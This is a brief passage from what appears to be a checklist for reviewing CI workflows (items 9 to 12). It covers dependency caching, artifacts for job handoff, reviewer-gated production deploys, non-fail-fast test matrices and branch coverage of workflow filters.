> 9. Dependency caching present; artifacts (not caches) used for job handoff.
> 10. Production deploys behind an environment with required reviewers.
> 11. `fail-fast: false` on test matrices so you see all failures.
> 12. The workflow exists on the branches its filters claim to cover.
